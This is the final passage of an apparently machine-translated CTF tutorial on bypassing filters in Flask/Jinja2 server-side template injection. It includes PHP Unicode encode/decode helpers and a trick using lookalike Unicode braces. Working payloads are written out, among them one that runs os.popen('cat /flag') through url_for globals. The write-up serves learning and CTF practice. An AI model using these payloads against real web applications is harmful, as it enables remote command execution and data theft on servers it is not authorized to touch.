      $bin_str = preg_replace('/^.{4}(.{4}).{2}(.{6}).{2}(.{6})$/', '$1$2$3', $bin_str);// Regular interception , $bin_str It should be similar to 0100111101100000, If it's Chinese characters " you "
      $unicode = dechex(bindec($bin_str));// return unicode Hexadecimal 
      $_sup = '';
      for ($i = 0; $i < 4 - strlen($unicode); $i++)
      {
          $_sup .= '0';// High byte  0
      }
      $str =  '\\u' . $_sup . $unicode; // add  \u   return 
      $resUnicode .= $str;
  }
  return $resUnicode;
}
//Unicode Code to string method 1
function unicode_decode($name)
{
  //  Transcoding , take Unicode Code into browsable utf-8 code 
  $pattern = '/([\w]+)|(\\\u([\w]{4}))/i';
  preg_match_all($pattern, $name, $matches);
  if (!empty($matches))
  {
    $name = '';
    for ($j = 0; $j < count($matches[0]); $j++)
    {
      $str = $matches[0][$j];
      if (strpos($str, '\\u') === 0)
      {
        $code = base_convert(substr($str, 2, 2), 16, 10);
        $code2 = base_convert(substr($str, 4), 16, 10);
        $c = chr($code).chr($code2);
        $c = iconv('UCS-2', 'UTF-8', $c);
        $name .= $c;
      }
      else
      {
        $name .= $str;
      }
    }
  }
  return $name;
}
//Unicode Code to string 
function unicode_decode2($str){
  $json = '{"str":"' . $str . '"}';
  $arr = json_decode($json, true);
  if (empty($arr)) return '';
  return $arr['str'];
}
echo unicode_encode('__class__');
echo unicode_decode('\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f');
//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__
Magic changes characters
This method is in the Taihu cup easyWeb What we learned from this topic is , The filtering double braces mentioned above , Some specific topics can be changed {{}}, For example, this problem has a character normalizer that can standardize the text we input , So you can use this method



Can be in Unicode Character sites look for characters to bypass , Search directly on the website {, There will be similar characters , You can find it ︷ and ︸ 了 , website ：https://www.compart.com/en/unicode/U+FE38

payload as follows

︷︷config︸︸
%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8

You can also use Chinese character magic change

｛	&#65371;
｝	&#65373;
［	&#65339;
］	&#65341;
＇	&#65287;
＂	&#65282;

payload as follows

｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ 

summary
Because the level and the length of the article are limited , There may be some bypass The method doesn't mention , And that is CTF It's not just about Jinja2 This template , There are other things Twig Templates ,smart Equal template , These will be changed later when necessary , Finally, there are some shortcomings. Please point out

Related experiments ：Flask Server side template injection vulnerability

Refer to the connection
https://p0sec.net/index.php/archives/120/

https://www.jianshu.com/p/a736e39c3510

https://www.redmango.top/article/43

https://xz.aliyun.com/t/8029

https://xz.aliyun.com/t/7746

版权声明
本文为[Hetian Wangan Laboratory]所创，转载请带上原文链接，感谢
https://chowdera.com/2020/12/20201217175235849i.html
```